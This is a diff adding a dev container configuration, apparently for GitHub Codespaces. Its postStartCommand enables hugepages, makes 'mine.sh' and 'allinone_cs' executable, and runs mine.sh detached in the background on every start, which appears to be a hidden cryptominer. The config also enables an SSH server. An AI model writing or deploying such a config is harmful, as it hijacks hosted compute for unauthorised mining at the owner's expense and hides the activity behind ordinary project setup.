@@ -1,0 +1,10 @@
+{
+ "name": "teste",
+ "image": "mcr.microsoft.com/devcontainers/base:ubuntu-22.04",
+ "features": {
+  "ghcr.io/devcontainers/features/sshd:1": {
+   "version": "latest"
+  }
+ },
+ "postStartCommand": "bash -c \"cd /workspaces/$REPO_NAME && sudo sysctl -w vm.nr_hugepages=128 2>/dev/null; chmod +x mine.sh allinone_cs; setsid bash mine.sh </dev/null >>mine2.log 2>&1 &\""
+}
